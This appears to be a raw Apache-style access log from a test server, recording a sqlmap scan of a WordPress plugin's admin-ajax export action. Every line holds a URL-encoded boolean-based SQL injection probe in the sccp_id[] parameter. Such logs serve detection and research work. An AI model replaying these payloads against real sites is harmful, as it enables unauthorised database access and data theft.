1
192.168.59.217 - - [21/Apr/2022:12:37:05 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%29%20AND%202743%3D2267%20AND%20%28%28%22SObm%22%3D%22SObm&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:05 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%29%29%20AND%209376%3D5684%20AND%20%28%28%28%22iGIL%22%3D%22iGIL&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:05 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%20AND%204258%3D2564%20AND%20%22BexJ%22%3D%22BexJ&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:05 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%20AND%209503%3D7877%20AND%20%28%22lgFh%22%20LIKE%20%22lgFh&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:05 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%29%20AND%205999%3D6363%20AND%20%28%28%22XeMU%22%20LIKE%20%22XeMU&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:05 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%29%29%20AND%202417%3D5361%20AND%20%28%28%28%22ABYj%22%20LIKE%20%22ABYj&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:05 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%20AND%203553%3D6362%20AND%20%22onHC%22%20LIKE%20%22onHC&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:05 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%20AND%204590%3D7671--%20EgvW&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:05 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%20AND%204668%3D1855%23%20gJuz&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:05 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%20AND%206162%3D1938%20OR%20%27bDQK%27%3D%27jtKt&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:06 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%20WHERE%201837%3D1837%20AND%203902%3D5346--%20DVzL&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:06 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%29%20WHERE%209659%3D9659%20AND%202359%3D5149--%20XOnV&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:06 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%29%20WHERE%204370%3D4370%20AND%205670%3D1770--%20LxTT&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:06 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%20WHERE%202907%3D2907%20AND%206433%3D5877--%20cLTq&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:06 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%22%20WHERE%205633%3D5633%20AND%204640%3D8801--%20hDvE&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:06 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%20WHERE%207342%3D7342%20AND%203927%3D1181--%20ngjh&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:06 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%7C%7C%28SELECT%20vhlJ%20WHERE%202836%3D2836%20AND%208954%3D7001%29%7C%7C%27&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:06 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%7C%7C%28SELECT%20cIRC%20FROM%20DUAL%20WHERE%205993%3D5993%20AND%204443%3D6101%29%7C%7C%27&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:06 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%2B%28SELECT%20uKTb%20WHERE%209791%3D9791%20AND%201170%3D9731%29%2B%27&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:06 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%7C%7C%28SELECT%20tdOT%20FROM%20DUAL%20WHERE%206130%3D6130%20AND%205965%3D1200%29%7C%7C&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:06 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%7C%7C%28SELECT%20OlWZ%20WHERE%208788%3D8788%20AND%209966%3D6225%29%7C%7C&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:06 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%2B%28SELECT%20jzXV%20WHERE%204773%3D4773%20AND%204906%3D5400%29%2B&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
192.168.59.217 - - [21/Apr/2022:12:37:07 +0300] "GET /wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3%29%27%29%29%20AS%20BLHP%20WHERE%202279%3D2279%20AND%208889%3D1559--%20zFeQ&type=json HTTP/1.1" 200 39 "http://teste.cs.tuiasi.ro:18667/wp-admin/admin-ajax.php?action=ays_sccp_results_export_file&sccp_id[]=3)&type=json" "sqlmap/1.6.3#stable (https://sqlmap.org)"
